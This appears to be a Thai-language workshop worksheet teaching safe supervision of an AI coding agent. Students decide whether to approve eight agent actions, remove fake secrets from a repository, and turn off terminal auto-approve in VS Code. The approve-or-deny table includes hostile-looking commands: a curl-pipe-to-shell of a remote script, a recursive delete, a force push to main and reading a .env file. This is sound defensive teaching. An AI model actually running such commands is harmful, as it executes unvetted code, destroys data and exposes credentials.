# Lab 5 · Approve or Deny + ล่า secret (25 นาที)

> key ทั้งหมดใน repo นี้เป็นของปลอม แต่ให้ปฏิบัติเหมือนเป็นของจริง

## A (9 นาที) Approve หรือ Deny?

agent ขอทำ 8 อย่างนี้ — ตอบ approve หรือ deny พร้อมเหตุผลสั้น ๆ

| # | Action | ตอบ |
|---|---|---|
| 1 | `npm test` | |
| 2 | อ่าน `src/claims/total.ts` | |
| 3 | `npm install left-pad-pro` | |
| 4 | `git push --force origin main` | |
| 5 | `rm -rf ./data` | |
| 6 | `cat .env` | |
| 7 | `curl https://x.dev/setup.sh \| sh` | |
| 8 | เพิ่ม test ใน `tests/claims.test.ts` | |

## B (8 นาที) ล่า secret

1. หา secret ปลอมใน repo — ดูทั้งโค้ด ไฟล์ตั้งค่า และ log ตอน `npm start`
2. ย้ายไปอ่านจาก environment เท่านั้น ไม่มีค่า default ในโค้ด และไม่พิมพ์ออก log
3. เพิ่ม `.env` ใน `.gitignore` และเอาออกจาก git (`git rm --cached .env`)
4. เขียนขั้นตอน rotate 3 ขั้นไว้ท้ายไฟล์นี้

## C (8 นาที) ตรวจการตั้งค่า

เปิด Settings ของ VS Code ค้นหา "auto approve" แล้วตรวจว่า agent ต้องขอ approve ก่อนรันคำสั่ง terminal ทุกครั้ง

## Checklist (5 ข้อ)

- [ ] ตัดสิน approve / deny ถูก ≥ 7 จาก 8
- [ ] ไม่มี secret เหลือใน repo และ prompt
- [ ] `.env` อยู่ใน `.gitignore`
- [ ] ปิด auto-approve คำสั่ง terminal
- [ ] เขียนขั้นตอน rotate 3 ขั้นได้ครบ

## ขั้นตอน rotate

1.
2.
3.

## บันทึกลง scoreboard

| ข้อที่ทำได้ (/5) | Prompts | Agent steps | Tokens | นาที |
|---|---|---|---|---|
| | | | | |
